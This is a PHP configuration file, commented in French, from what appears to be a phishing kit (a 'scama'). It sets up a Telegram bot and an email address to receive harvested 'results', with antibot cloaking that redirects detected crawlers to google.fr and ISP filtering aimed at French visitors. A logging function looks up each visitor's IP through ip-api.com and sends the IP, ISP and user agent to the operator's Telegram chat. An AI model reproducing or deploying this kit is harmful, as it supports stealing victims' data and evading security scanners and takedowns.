<?php
/*
 $log_bot : Active ou non l'envoi de logs sur votre bot télégram. Les logs afficheront si la connexion a été autorisée ou refusée
 Pour activer : true, pour désactiver : false
 -------------
 $whitelist_ip : Autorisez votre adresse IP afin de voir votre scama. Utile si vous utilisez un VPN et que vous êtes bloqué par l'antibot.
 -------------
 $antibotRedirect : Choisissez un URL de redirection si un bot est détecté
 -------------
 $antibotToken : Ne pas toucher
 -------------
 $chatID : L'ID de votre chat avec votre bot telegram
 -------------
 $botToken : Le token de votre bot telegram.
 -------------
 $send_mail : Envoyer les résultats par mail. true = actif / false = inactif
 -------------
 $send_telegram : Envoyer les résultats par mail. true = actif / false = inactif
 -------------
 $mail : Mail pour recevoir les résultats
 -------------
 $test_ip = '';  : Ne pas toucher, laisser vide


*/

$botToken = '';
$chatID = '';
$mail = '';
$antibotToken = '8GjRbUGQdkbkQ5wSrpDT-l2jwITn03k-NOvvHx2yw9atS';
$antibotRedirect = 'https://google.fr';
$whitelist_ip = 'XX.XX.XX.XX';
$send_mail = false;
$send_telegram = true;
$log_bot = true;
$test_ip = '';

// Filtre Killbot première couche
$killbot_active = true;

// Filtres ISP deuxième couche
$isp_italy_check = false;
$isp_austria_check = false;
$isp_swiss_check = false;
$isp_netherlands_check = false;
$isp_deutschland_check = false;
$isp_danish_check = false;
$isp_sweden_check = false;
$isp_canada_check = false;
$isp_france_check = true;
$isp_portugal_check = false;
$isp_spain_check = false;
$isp_ireland_check = false;
$isp_UK_check = false;
$isp_luxembourg_check = false;
$isp_belgium_check = false;
$isp_uea_check = false;
$isp_usa_check = false;

function logBot($accepted, $ip, $botToken, $chatID, $log_bot, $isKillbot, $agent){
    $who = $isKillbot == true ? 'KILLBOT' : 'ISP CHECK';
    if ($log_bot == true){
        if ($accepted == true)
            $string = 'Acceptée';
        else
            $string = 'Bloquée';
        $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip);
        $ipinfo_json = json_decode($ipinfo, true);
        if ($ipinfo_json['status'] != 'fail')
            $org = "{$ipinfo_json['as']}";
        else
            $org = "Introuvable";
        $urls = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=";
        $data ="ISP: $org\nIP : $ip\n" . "CONNEXION : $string " . "\n$who\n$agent";
        file_get_contents($urls . urlencode($data));
    }
}

